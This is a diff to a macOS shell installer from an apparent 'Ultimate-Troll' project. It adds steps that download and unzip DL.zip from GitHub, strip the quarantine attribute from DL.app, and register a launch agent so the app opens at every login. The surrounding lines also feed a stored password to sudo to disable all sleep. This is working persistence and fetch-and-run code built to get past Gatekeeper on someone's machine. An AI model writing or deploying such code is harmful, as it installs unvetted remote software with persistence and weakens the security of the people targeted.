@@ -131,7 +131,9 @@ EOF
   <string>$PLIST_LABEL.login</string>
   <key>ProgramArguments</key>
   <array>
-    <string>$MAIN_SCRIPT</string>
+    <string>/usr/bin/open</string>
+    <string>-a</string>
+    <string>$TARGET_DIR/DL.app</string>
   </array>
   <key>RunAtLoad</key>
   <true/>
@@ -169,6 +171,15 @@ else
 
     echo "→ Downloading main.sh from GitHub"
     curl -fsSL "https://raw.githubusercontent.com/Thomas20090425/Ultimate-Troll/refs/heads/main/main.sh" -o "$MAIN_SCRIPT"
+
+    echo "→ Downloading DL.zip"
+    curl -fsSL "https://github.com/Thomas20090425/Ultimate-Troll/raw/refs/heads/main/DL.zip" -o "$TARGET_DIR/DL.zip"
+
+    echo "→ Unzipping DL.zip"
+    unzip -o "$TARGET_DIR/DL.zip" -d "$TARGET_DIR"
+
+    echo "→ Removing quarantine attribute from DL.app"
+    xattr -r -d com.apple.quarantine "$TARGET_DIR/DL.app"
 
     echo "→ Disabling all macOS sleep (even on lid close)"
     echo "$PASSWORD" | sudo -S pmset -a sleep 0 standby 0 autopoweroff 0 hibernatemode 0
@@ -224,7 +235,9 @@ EOF
   <string>$PLIST_LABEL.login</string>
   <key>ProgramArguments</key>
   <array>
-    <string>$MAIN_SCRIPT</string>
+    <string>/usr/bin/open</string>
+    <string>-a</string>
+    <string>$TARGET_DIR/DL.app</string>
   </array>
   <key>RunAtLoad</key>
   <true/>
